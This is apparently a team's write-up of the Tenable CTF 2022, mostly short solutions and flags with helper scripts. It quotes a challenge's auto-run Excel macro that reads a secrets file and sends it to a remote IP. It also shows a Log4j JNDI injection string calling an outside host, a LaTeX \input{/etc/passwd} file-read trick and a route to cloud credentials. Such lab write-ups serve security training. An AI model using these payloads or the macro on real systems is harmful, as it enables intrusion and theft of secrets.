# Tenable CTF 2022

Erreichte Punktzahl: 2800
Platz: 50 von ~1200

## Tenable

### A Cube and a Palindrome (100) ✅

``` powershell
.\nasl.exe -W .\timestamp.nbin
```

Dann wird eine Datei in dem Ordner erzeugt. Von dieser muss der unixtimestamp in die Shell-Abfrage reingepackt werden.

### False Flags (100) ❌

In den Nessus Scan Information steht drin: flag{H5dY_pysR_4J3c_H3XA}
ist aber noch falsch bzw. muss noch angepasst werden...

\-

### Whats in a Name? (100) ✅

Folgende Hostnames diese sollen irgendwie Sinn ergeben?

```
2032F96D,E54D4713,4AB20152,5B02078A,B5423A87,21A2FBE4,D1DD6644,2A70BE18,DCAC5DF2,B6B7C858,98C32FB0,E1959490,E6B20ABE,5FD93E34,03185AA2,9946F858,4978472A,586476EA,E9FA7C51,CC25FC42,778FE17F,CF696355,250D381A,9C31F2CC,8FC1949D,2B81FA32,69B5F6E6,624E2E25,ADB5153D,19FB47F3,22A564FC
```
| IP             | Hostname  |
|----------------|-----------|
| 192.168.10.116 | 21A2FBE4  |
| 192.168.11.104 | D1DD6644  |
| 192.168.12.116 | DCAC5DF2  |
| 192.168.12.52  | 2A70BE18  |
| 192.168.13.95  | B6B7C858  |
| 192.168.14.119 | E1959490  |
| 192.168.14.95  | 98C32FB0  |
| 192.168.15.104 | E6B20ABE  |
| 192.168.16.104 | 9946F858  |
| 192.168.16.49  | 5FD93E34  |
| 192.168.16.99  | 03185AA2  |
| 192.168.17.119 | 586476EA  |
| 192.168.17.95  | 4978472A  |
| 192.168.18.51  | E9FA7C51  |
| 192.168.18.95  | CC25FC42  |
| 192.168.18.99  | 778FE17F  |
| 192.168.19.108 | 250D381A  |
| 192.168.19.52  | CF696355  |
| 192.168.20.108 | 9C31F2CC  |
| 192.168.21.95  | 8FC1949D  |
| 192.168.21.97  | 2B81FA32  |
| 192.168.22.104 | 624E2E25  |
| 192.168.22.95  | 69B5F6E6  |
| 192.168.23.115 | 19FB47F3  |
| 192.168.23.116 | 22A564FC  |
| 192.168.23.125 | 8B0449A4  |
| 192.168.23.48  | ADB5153D  |
| 192.168.8.102  | 2032F96D  |
| 192.168.8.108  | E54D4713  |
| 192.168.9.103  | 5B02078A  |
| 192.168.9.123  | B5423A87  |
| 192.168.9.97   | 4AB20152  |
| 192.168.9.97   | 4AB20152. |

Flag war in dem letzten Oktet der IP-Adressen. Sortiert nach dem 3ten und 4ten Oktet.

_flag{th4t__wh1ch_w3_c4ll_a_h0st}_

### Fun with NASL (100) ✅

```ps
PS C:\Users\Pollux\Downloads> & "C:\Program Files\Tenable\Nessus\nasl.exe" -W -P 'line_numbers=20,33,71,5' .\flag.nasl
flag{N4SL_is_n34t}
```

_flag{N4SL_is_n34t}_

### Why Can't You E-Mail Memes to a Jedi? (300) ❌

\-

---

## Stego

### Blurry.png (100) ❌

```
flag{blurring_xxxt_xxx_good_xxxx}
flag{blurring_xxxt_sent_good_xxxx}
```

\-

### Vacation Slideshow (100) ❌

\-

### Optical Character Frustration (200) ✅

Just parse all the characters in the image and then put the hex string in cyberchef.

Start by converting the image into a pixmap:
```
convert challenge.png challenge.xpm
```

You maybe have to tweak your Imagick policies to allow for large inputs. Just look up how to do that.

Script for extracting the characters from `challenge.xpm`:
```php
<?php

file_put_contents('result.txt', '');

$data = file_get_contents('challenge.xpm');
$START_OFFSET = 19;
$END_OFFSET = 26;
$ROW_HEIGHT = 7;
$ROW_OFFSET_START = 10;
$ROW_OFFSET_END = 7;
$MAX_LINE_LENGTH = 1218;

$lines = explode(PHP_EOL, $data);

$map = [];

// Remove the top, bottom, left and right edges
// Also transform space to underscores and dots to hashtags. Simply for readability.
for ($i = 0; $i < (count($lines) - $START_OFFSET - $END_OFFSET); $i++) {
    $map[$i] = [];
    for ($j = 0; $j < ($MAX_LINE_LENGTH - $ROW_OFFSET_START - $ROW_OFFSET_END); $j++) {
        $map[$i][$j] = $lines[$i + $START_OFFSET][$j + $ROW_OFFSET_START] == '.' ? '#' : '_';
    }
}

// Delete empty lines
if (true) {
    $delete = false;
    $j = 0;
    $count = count($map);
    for ($i = 0; $i < $count; $i++) {
        if ($j >= 7) {
            unset($map[$i]);
        } 
        $j++;

        if ($j == 15) {
            $j = 0;
        }
    }
}

// Heal the array from manually unsetting stuff
$map = array_values($map);

// Define a compare function for later use
function comparePattern($patternA, $patternB, $previousChar) {
    $heigth = count($patternA);
    $width = strlen($patternA[0]);

    $errors = 0;

    for ($i = 0; $i < $heigth; $i++) {
        for ($j = 0; $j < $width; $j++) {
            if ($patternA[$i][$j] != $patternB[$i][$j]) {
                $errors++;
            }
        }
    }

    // Some of the characters affect their preceeding neighbors.
    // That's why we have to allow some margin of errors for those neighbors.
    
    if ($errors === 0) {
        return true;
    }
    
    if ($errors === 1 && strpos('abd147', $previousChar) >= 0) {
        return true;
    }

    if ($errors === 2 && strpos('abd147', $previousChar) >= 0) {
        return true;
    }

    if ($errors > 2) {
        return false;
    }
}

// Our digits/letters line by line. 6x7.
$characters = [
    '0' => ['__###_', '_##_##', '_##_##', '_##_##', '_##_##', '_##_##', '__###_'],
    '1' => ['___##_', '_####_', '___##_', '___##_', '___##_', '___##_', '_#####'],
    '2' => ['__###_', '_##_##', '____##', '___##_', '__##__', '_##_##', '_#####'],
    '3' => ['__###_', '_##_##', '____##', '__###_', '____##', '_##_##', '__###_'],
    '9' => ['__###_', '_##_##', '_##_##', '__####', '____##', '_##_##', '__###_'],
    '4' => ['____##', '___###', '__#_##', '_##_##', '_#####', '____##', '____##'],
    '5' => ['_#####', '_##___', '_####_', '_##_##', '____##', '_#__##', '_####_'],
    '6' => ['__###_', '_##_##', '_##___', '_####_', '_##_##', '_##_##', '__###_'],
    '7' => ['_#####', '_##_##', '____##', '___##_', '___##_', '__##__', '__##__'],
    '8' => ['__###_', '_##_##', '_##_##', '__###_', '_##_##', '_##_##', '__###_'],
    'a' => ['______', '______', '__###_', '_##_##', '__####', '_##_##', '_#####'],
    'b' => ['_##___', '_##___', '_####_', '_##_##', '_##_##', '_##_##', '_####_'],
    'c' => ['______', '______', '__###_', '_##_##', '_##___', '_##_##', '__###_'],
    'd' => ['___###', '____##', '__####', '_##_##', '_##_##', '_##_##', '__####'],
    'e' => ['______', '______', '__###_', '_##_##', '_#####', '_##___', '__####'],
    'f' => ['___###', '__##__', '_#####', '__##__', '__##__', '__##__', '_#####'],
    ' ' => ['______', '______', '______', '______', '______', '______', '______']
];

// Now we evaluate each pattern and map it to a specific digit/letter.

$result_string = '';

$CHARS_PER_ROW = 200;
$HEIGHT = 7;
$WIDTH = 6;

$hex_result = '';
$previousChar = '0';

for ($q = 0; $q < (count($map) / $HEIGHT); $q++) {
    for ($i = 0; $i < ($CHARS_PER_ROW); $i++) {
        $pattern = [];
        for ($h = 0; $h < $HEIGHT; $h++) {
            $pattern[$h] = '';
            for ($j = 0; $j < $WIDTH; $j++) {
                $pattern[$h] .= $map[$q * $HEIGHT + $h][$i * $WIDTH + $j];
            }
        }

        foreach ($characters as $key => $char) {
            if (comparePattern($char, $pattern, $previousChar)) {
                $hex_result .= $key;
                $previousChar = $key;
            }
        }

    }
}

file_put_contents('hex_result.txt', $hex_result);
```

_flag{ocr_has_gotten_pretty_good}_

### Tomb Raider (200) ❌

\-

### Don't Panic! (200) ❌

\-

### Characters of Shakespeare's Plays (200) ✅

Einfach das original raus suchen und matchen. Alle missing characters -> flag außerdem () durch {} ersetzen

_flag{It's not the notes you play, it's the notes you don't play}_

### Critter in the Orchard (400) ❌

\-

---

## Signal Processsing

### Your Call is Importtant to Us (200) ❌

\-

### O'er Hill and Hale (300) ❌

\-

---

## Reverse Engineering

### Olden Ring (100) ❌

\-

### Pride in Stitches (200) ❌

\-

### Commander Keen in the Starry Skies (200) ❌

\-

### Lean and Mean (200) ❌

\-

### Casper the Friendly Sysop (200) ❌

\-

### Church of the Zeros and Ones (200) ❌

\-

### Murder Mystery (200) ❌

\-

### Decryptor (200) ❌

\-

### Open Sesame 1 (200) ❌

\-

### Open Sesame 2 (300) ❌

\-

### Slycomm (300) ❌

\-

---

## OSINT

### Find Me if You can (100) ✅

view-source:https://www.tenable.com/blog/spring4shell-faq-spring-framework-remote-code-execution-vulnerability

_flag{sH3L1_sH0Ck3D}_

### Back Then (300) ❌

\-

### Lets Network (100) ✅

view-source:https://www.tenable.com/blog/cve-2022-20699-cve-2022-20700-cve-2022-20708-critical-flaws-in-cisco-small-business-rv-series

_flag{RV_tH3rE_Y3t}_

### Can you dig it? (100) ✅

view-source:https://www.tenable.com/blog/cve-2022-30190-zero-click-zero-day-in-msdt-exploited-in-the-wild

_flag{Z3r0\_cL1cKS\_iS\_@l1\_iT\_TAk3s}_

---

## Programming

### The Eavesdropper (300) ❌

\-

---

## Forensics

### Top Secret (100) ✅

Just pull the censor rectangle away.

_flag{rememb3r_t0_flatt3n_ur_PDF5}_

### The One with a Lot of Cats (200) ✅

When you manually grep for the occurrence of "JFIF" in the ctf.img file you'll get 505 results. Which means that there are at least 505 images.

```
└─$ grep JFIF ctf.img -ao | wc -l
505
```

However, if you count the files after we mounted the ctf.img file. You'll see that only 504 got "extracted/mounted" with "JFIF".

```
└─$ rgrep -ao JFIF . | wc -l
504
```

That means the ctf.img file still contains one hidden image. So we wrote an extractor and skipped through the cat images until we found an image with the flag as text.

Extractor:
```php
<?php

$data = file_get_contents('ctf.img');
$image_data = "";

exec('mkdir extracted_images');

$active_image = false;
$end_of_image = false;

for ($i = 0; $i < strlen($data); $i++) {
    
    if ($i+2 < strlen($data)) {
        // JPEG Magic Bytes
        if ($data[$i] == "\xff" && $data[$i+1] == "\xd8" && $data[$i+2] == "\xff") {
            $active_image = true;
            $image_data = "";
            echo 'Found image start: ' . $i . PHP_EOL;
        }
    }
    if ($i+1 < strlen($data)) {
        // EOI End Of Image
        if ($data[$i] == "\xff" && $data[$i+1] == "\xd9") {
            $end_of_image = true;
            echo 'Found image end: ' . $i . PHP_EOL;
        }
    }

    if ($end_of_image) {
        if (!strlen($image_data) == 0) {
            file_put_contents('./extracted_images/' . $i . '.jpg', $image_data);
        }
        $image_data = "";
        $end_of_image = false;
        $active_image = false;
        continue;
    }

    if ($active_image) {
        $image_data.= $data[$i];
    }
}
```

![](https://i.imgur.com/AeLuxXs.png)


_flag{m30w}_

### Strange Packets (100) ✅

Just open it in wireshark. Each 2nd packet contains a letter in a specific data segment. Just keep pressing the down arrow until you spot the word flag distributed over 8 packets.

_flag{m0dbu5_is_4_simpl3_ProtOcol}_

### Dropbox Forensics (300) ❌

\-

### Data Exfil (200) ✅

Wireshark dump in welchem mittels ICMP ein Bild übertragen wird.
![](https://i.imgur.com/vpnCuVa.png)

![](https://i.imgur.com/pi46Alv.png) 
- (1) die ICMP Pakete mit Payload finden. (Schwarz makiert)
- (2&3) aus diesen NUR die Daten ohne den ICMP Header anzeigen lassen
- (4) die Daten als Roh anzeigen lassen und alle hintereinander Cyberchef übergeben

![](https://i.imgur.com/vVJJ0jT.png)
mit dem RAW Hexdump Cyberchef seine Magie machen lassen.

### Macro Economics (100) ✅

Open the file with Excel. Look at the decompiled Visual Basic Macro.

```vb
Private Sub Workbook_Open()

Dim byteArr() As Byte
Dim fileInt As Integer: fileInt = FreeFile
Open "C:/docs/secrets.txt" For Binary Access Read As #fileInt
ReDim byteArr(0 To LOF(fileInt) - 1)
Get #fileInt, , byteArr
Close #fileInt

Dim tmpStr As String
tmpStr = sendFile(byteArr())
End Sub

Function sendFile(b() As Byte) As String
  Dim tmpStr As String
  Dim midStr As String
  Dim out As String
  Dim urlStr As String
  Dim code As String
  Dim i
  urlStr = "URL;http://10.13.37.3/"
  req (urlStr)
  code = Range("A1").Value
  tmpStr = StrConv(b(), vbUnicode)
  For i = 1 To 256 Step 8
    midStr = Mid(tmpStr, i, 8)
    out = Cipher(midStr, code)
    out = ByteArrayToHexStr(StrConv(out, vbFromUnicode))
    urlStr = "URL;http://10.13.37.3/?" & CStr(out)
    req (urlStr)
    code = Range("A1").Value
  Next i
  sendFile = tmpStr
End Function

Function req(url As String)
  With ActiveSheet.QueryTables.Add(Connection:=url, Destination:=Range("A1"))
    .PostText = ""
    .PreserveFormatting = True
    .RefreshOnFileOpen = False
    .BackgroundQuery = False
    .RefreshStyle = xlOverwriteCells
    .WebSelectionType = xlEntirePage
    .WebPreFormattedTextToColumns = True
    .Refresh BackgroundQuery:=False
    .WorkbookConnection.Delete
    End With
End Function

Public Function Cipher(Text As String, Key As String) As String
  Dim bText() As Byte
  Dim bKey() As Byte
  Dim TextUB As Long
  Dim KeyUB As Long
  Dim TextPos As Long
  Dim KeyPos As Long
  
  bText = StrConv(Text, vbFromUnicode)
  bKey = StrConv(Key, vbFromUnicode)
  TextUB = UBound(bText)
  KeyUB = UBound(bKey)
  For TextPos = 0 To TextUB
    bText(TextPos) = bText(TextPos) Xor bKey(KeyPos)
    If KeyPos < KeyUB Then
      KeyPos = KeyPos + 1
    Else
      KeyPos = 0
    End If
  Next TextPos
  Cipher = StrConv(bText, vbUnicode)
End Function

Function ByteArrayToHexStr(b() As Byte) As String
   Dim n As Long, i As Long

   ByteArrayToHexStr = Space$(3 * (UBound(b) - LBound(b)) + 2)
   n = 1
   For i = LBound(b) To UBound(b)
      Mid$(ByteArrayToHexStr, n, 2) = Right$("00" & Hex$(b(i)), 2)
      n = n + 3
   Next
   ByteArrayToHexStr = Replace(ByteArrayToHexStr, " ", "")
End Function
```

The Macro reads in a file called `C:/docs/secrets.txt` and then sequentially "_encrypts_" (XORs) 8 bytes of the data with 8 bytes of a key. The key will be provided by an external server. The macro requests a key, encrypts the data and then responds with the encrypted message. Open the supplied PCAP file with Wireshark and add 2 columns for I think `http.request.query` and `http.data`. Afterwards export the data and fold them into the following arrays. Then just XOR them.

```php
<?php

$keys = [
    '7bxvco1sj8gwpr92',
    '0uctdhbg9rzyvq57',
    'l3aupyodmehvzfk6',
    '0upkfmbanov57z9x',
    '6m2yx8fu9qd7kr4c',
    '2v6hqa0b9t3w5fjd',
    'n35aom7yfqzd04iu',
    '93md6gizvlypw1ox',
    'txqgj3u5d9woz7na',
    'x5h3by9m0cre42k7',
    'ehvuk4majq2tg10c',
    '8nmdwociyse0lab2',
    'j9sfkvy3pwqxoeah',
    'nw5s2kvijzqref9c',
    'efbxmd4n5i8rkgya',
    '1cnko9v30dp2rexf',
    'qp5oawce3uhvml21',
    'lu94s012goyt8iba',
    'bsohq3igya5dr42n',
    'gsz6oc7m9583krfi',
    'mb4xgiep72kcs1hv',
    'l0rgne84jszcqxu6',
    'xl5uba3zshrcdmjn',
    'qofkayrevwml9gdx',
    'jcora4up78kbqs5t',
    '43prh2zl0g9djqos',
    '8u2yiaj1pqwneb6s',
    '759d2iwjhyqpl1vb',
    'btvq9en5wgy1r4dx',
    '4yol2gx7mhijzur0',
    'kz47slmu1cdrfhi6',
    'qyw3zn9tmarix507',
    'vmbcl8rnxked2zf9'
];
    
$crypt = [
    '184D5825262C6336',
    '6426435B4B626833',
    '045A125516100301',
    '10161F05120C0B0F',
    '454D53590B5D0507',
    '5702161C19004442',
    '034646154F0F5259',
    '52561D101614081C',
    '1156516D60641047',
    '1D150147420D564D',
    '03091A194B5D0315',
    '574E190C124F141B',
    '0557144603171757',
    '1D575C071208191C',
    '0902421A0844411D',
    '54074E0D004B565E',
    '1803510A0413104B',
    '667F71510155115B',
    '16530C071C561A49',
    '6D791C5A0E044C09',
    '5D0C402754070412',
    '00552D0A0F064A04',
    '0B113F7F2608575A',
    '0800134B02180606',
    '024306065E142118',
    '5547500509415A05',
    '4C7F38320C041A11',
    '5E411917570A050F',
    '165A563A5C001E15',
    '5D0D4F1F53011D19',
    '61701B18533F2836',
    '233C23605A41167E',
];

for($i = 0; $i < count($crypt); $i++) {
    for ($j = 0; $j < 8; $j++) {
        $value = hex2bin($crypt[$i][$j*2] . $crypt[$i][$j*2 + 1]);
        echo $value ^ $keys[$i][$j];
    }
}
```

This results in the following output:
```
// SECRETS //

This file contains a secret that must be kept safe. 

Were it to fall into the wrong hands it could be used for misdeeds.

Here it comes.

flag{d0nt_3nable_macr0s}

Did you catch it? That was it

Keep it secret. Keep it safe.

// SECRETS //
```

_flag{d0nt_3nable_macr0s}_

---

## PWN

### Quaggamire (100) ❌
running service Quagga (version 1.2.4) is exploitable
CVE-2021-44038


---

## ICS

### Industrial Automation (1 of 3) (100) ❌

\-

### Industrial Automation (2 of 3) (100) ❌

\-

### Industrial Automation (3 of 3) (100) ❌

\-

---

## Web

### Log Forge (100) ✅

${jndi:ldap://mbuelow.dev/dump/index.php}
http://192.168.3.16:1389/o=example


Login
administrator:Lumberj4ck123!

Log4j


In ./flag.txt:
_flag{log4j_1n_th3_l0g_f0rg3}_

### Baby Web 1 (100) ✅
In the source code

_flag{never_gonna_l3t_you_down}_

### Baby Web 2 (100) ✅
In the certificate field "State/Province"

_flag{n3v3r_g0nna_giv3_y0u_up}_

### Baby Web 3 (100) ✅
In robots.txt

_flag{never_gonna_tell_a_l13}_

### Baby Web 4 (100) ✅
In a response header called "ctf"

_flag{nev3r_gonn4_say_g00dbye}_

### ContinuuOS (100) ✅
login admin:Continu321!

JWT secret: 455b114503f70382f3ccd427ef45972cd2d35c41ee5abb2173d67d3ec54814f2 

Get Operations.php with the xml exploit.

Forge the jwt to output another file than the logfile. The file was located at "./flag.txt".

_flag{a_n1ce_cup_0f_jwt}_

### Notes (100) ✅
The lib used to generate the PDF is exploitable. YOu can output file gets like this: `\input{/etc/passwd}`

I haven't found the flag file jet.
Unfortunately, I can't get the ls command working.

`\input{/var/www/postNotes.php}` isn't working either.

Just get the _./aws/credentials_ and login.
list buckets and cp files

_flag{l4t3x_c4n_be_sc4ry}_

### The Obligatory Lambda Challenge (300) ❌

\-

---

## Misc

### Poor Murphy (100) ✅

Just open paint and rearrange some tiles with letters in them. You have the technology for this.

![](https://i.imgur.com/vYy6xDJ.png)


_flag{we_have_the_technology}_

### Bad Ladder Logic Arithmetic (100) ❌

\-

### Runes of the Ancient (100) ❌

\-

### Tech Support (100) ❌

\-

### Spy Notes (300) ❌

\-

---

## Crypto

### DIY Crypto (100) ✅

Known plaintext attack. The initial known plaintext were empty bytes. Also simply revert the sbox process before starting.

```php
<?php

$BLOCK_SIZE = 16;

$sbox = [
        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
];

$data = file_get_contents('crypted.txt');

$data_unxored = '';

for ($i = 0; $i < strlen($data); $i++) {
    $data_unxored .= chr(array_search(ord($data[$i]), $sbox));
}

file_put_contents('crypted_unxored.txt', $data_unxored);

echo 'Blocks: ' . strlen($data_unxored) / $BLOCK_SIZE;

$first_block = '';
for ($i = 0; $i < $BLOCK_SIZE; $i++) {
    $first_block .= $data_unxored[$i];
}
echo 'First Block: ' . $first_block . PHP_EOL;

$xor_key = "\x6f\x7a\x79\x3e\xbe\xce\xc1\x8a\xae\x79\x0f\x15\x91\x48\xf5\x01";

if (false) {
    $position = 5;
    for ($i = 0; $i < 256; $i++) {
        echo 'Trying ' . $i . ':' . bin2hex(chr($i)) . ' at pos ' . $position . ' => "';
        for ($j = 0; $j < strlen($xor_key); $j++) {
            echo $first_block[$j] ^ $xor_key[$j];
        }

        echo ($first_block[$position] ^ chr($i)) . '" (' . bin2hex($first_block[$position] ^ chr($i)) . ')' . PHP_EOL;
    }
}

for ($i = 0; $i < (strlen($data_unxored) / $BLOCK_SIZE); $i++) {
    echo 'Block ' . str_pad($i, 3, '0', STR_PAD_LEFT) . ': ';
    for ($j = 0; $j < $BLOCK_SIZE; $j++) {
        $xor = $data_unxored[$i * $BLOCK_SIZE + $j] ^ $xor_key[$j];
        if (ord($xor) < 32 || ord($xor) > 126) {
            echo '.';
        } else {
            echo $xor;
        }
    }

    echo '   (';
    for ($j = 0; $j < $BLOCK_SIZE; $j++) {
        $xor = $data_unxored[$i * $BLOCK_SIZE + $j] ^ $xor_key[$j];
        echo bin2hex($data_unxored[$i * $BLOCK_SIZE + $j]) . ',';
    }

    echo ')' . PHP_EOL;

    $xor_key = substr($xor_key, 1) . $xor_key[0];
}

```

_flag{cRyt0_aNalys1s_101}_

### Hackerized (100) ✅

∲↑Λç{⊥☐☐_↑33⊥_4_¥☐ü}

_flag{too_l33t_4_you}_

### Let's not die on this (100) ❌

\-

### Wifi Password of The Day (200) ❌

\-

### Elemental, My Dear Watson (200) ❌

\-

---

## z_Introduction


### CTF Basics (100) ✅

Sanity check flag

_flag{thanks_4_joining_us}_

### Discord Support (100) ✅

The name of the #general channel. The channel got renamed afterwards. Just scroll to to top.

_flag{disc0rd_fl4g}_